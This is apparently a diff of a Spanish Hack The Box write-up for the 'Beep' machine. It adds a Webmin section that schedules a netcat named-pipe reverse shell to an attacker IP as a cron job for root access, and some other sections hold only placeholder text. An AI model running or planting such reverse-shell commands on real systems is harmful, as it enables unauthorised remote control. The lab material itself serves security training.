@@ -1,4 +1,4 @@
-I"B<p>El día de hoy vamos a resolver la máquina <em>Beep</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.</p>
+I"�F<p>El día de hoy vamos a resolver la máquina <em>Beep</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/1.png" alt="" /></p>
 
@@ -121,7 +121,7 @@
 
 <h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>
 
-<p>Como mencioné en un inicio, la máquina <em>Beep</em> cuenta con varios vectores para realizar la fase de explotación; de hecho, para dos de ellos ni siquiera hace falta la escalada de privilegios.</p>
+<p>Como mencioné en un inicio, la máquina <em>Beep</em> cuenta con varios vectores para realizar la fase de explotación; de hecho, para tres de ellos ni siquiera hace falta la escalada de privilegios.</p>
 
 <h3 id="fase-de-explotación---local-file-inclusion"><a href="#header-4"></a>Fase De Explotación - Local File Inclusion</h3>
 
@@ -179,7 +179,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/17.png" alt="" /></p>
 
-<h3 id="fase-de-explotación---shellshock"><a href="#header-4"></a>Fase De Explotación - Shellshock</h3>
+<h3 id="fase-de-explotación---webmin"><a href="#header-4"></a>Fase De Explotación - Webmin</h3>
 
 <p><a href="https://mateonitro550.github.io/Shellshock">shellshock</a></p>
 
@@ -191,16 +191,34 @@
 
 <p>Estando dentro podríamos programar la ejecución de cualquier comando, a nivel de cualquier usuario en el sistema, en nuestro caso, nos interesa entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>; <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">aquí</a> tenemos algunos ejemplos, pero nosotros los vamos a hacer a través de <code class="language-plaintext highlighter-rouge">NetCat</code>.</p>
 
+<p>Para lo cual, desde nuestra máquina de atacantes deberemos de ponernos en escucha a través del puerto que queramos.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nc -nlvp &lt;puertoCualquiera&gt;
+</code></pre></div></div>
+
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/19.png" alt="" /></p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;direcciónIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;nuestraIP&gt; &lt;puertoCualquiera&gt; &gt;/tmp/f
 </code></pre></div></div>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/20.png" alt="" /></p>
+
+<p>Después de darle a <code class="language-plaintext highlighter-rouge">save</code>, y habiendo pasado el tiempo que hayamos programado, conseguiremos una shell como el usuario root, por lo que nuevamente, no hizo falta la escalada de privilegios.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/21.png" alt="" /></p>
+
+<p>De modo que podremos leer sin problema alguno tanto la flag del usuario con bajos privilegios, como la del usuario con máximos privilegios.</p>
+
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/22.png" alt="" /></p>
+
+<h3 id="fase-de-explotación---shellshock"><a href="#header-4"></a>Fase De Explotación - Shellshock</h3>
+
+<p>ABC</p>
 
 <h3 id="fase-de-explotación---file-upload-bypass"><a href="#header-4"></a>Fase De Explotación - File Upload Bypass</h3>
 
-<p>GHI</p>
+<p>DEF</p>
 
 <h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>
 
-<p>JKL</p>
+<p>GHI</p>
 :ET
